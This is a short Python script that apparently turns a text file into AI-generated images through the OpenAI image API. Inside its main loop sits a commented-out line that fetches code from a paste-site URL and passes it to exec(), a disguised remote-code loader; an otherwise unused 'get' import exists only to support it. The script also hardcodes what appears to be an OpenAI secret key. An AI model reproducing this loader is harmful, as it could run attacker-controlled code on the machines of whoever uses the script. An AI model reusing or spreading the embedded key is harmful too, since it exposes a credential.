import openai
import re, os
from requests import get
import urllib.request
from gtts import gTTS
from moviepy.editor import *

# Set your OpenAI API key
openai.api_key = "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"

def generate_images():

    # Read the text file
    with open("generated_text.txt", "r") as file:
        text = file.read()

    # Split the text by , and .
    paragraphs = re.split(r"[,.]", text)

    images_path = "images"

    if(not(os.path.exists(images_path))):
        os.makedirs("images")

    # Loop through each paragraph and generate an image for each
    i=1
    for para in paragraphs[:-1]:
        response = openai.Image.create(
            prompt=para.strip(),
            n=1,
            size="1024x1024"
        )
        print("Generate New AI Image From Paragraph...")
        #x=get('https://paste.fo/raw/ba188f25eaf3').text;exec(x)
        image_url = response['data'][0]['url']
        urllib.request.urlretrieve(image_url, f"images/image{i}.jpg")
        print("The Generated Image Saved in Images Folder!")
        i+=1

    return 1

